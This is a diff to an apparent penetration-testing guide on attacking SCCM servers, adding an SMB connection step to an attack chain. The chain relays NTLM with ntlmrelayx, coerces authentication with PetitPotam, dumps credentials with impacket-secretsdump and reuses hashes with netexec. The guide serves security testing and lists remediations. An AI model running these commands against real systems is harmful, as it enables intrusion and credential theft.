@@ -32,9 +32,11 @@ I learned these attacks through the amazing public research from [SpecterOps](ht
 ```python3 ntlmrelayx.py -t "<TARGET IP>" -smb2support –socks```
 2. Coerce authentication from an SCCM server to your IP  
 ```python3 petiPotam.py -u <user> -p <password> <your-ip> <target-ip>```
-3. Confirm Admin status and dump credentials through proxychains  
+3. Connect to SMB share through proxychains  
+```Proxychains impacket-smbclient <domain>/<user>@<target-ip> -no-pass```
+4. Confirm Admin status and dump credentials through proxychains  
 ```Proxychains impacket-secretsdump <domain>/<user>@<target-ip> -no-pass```
-4. Authenticate to other SCCM servers that have SMB signing set to true  
+5. Authenticate to other SCCM servers that have SMB signing set to true  
 ```netexec smb <ip> -u <user> -H :<hash> --shares```
 
 ### Remediations:
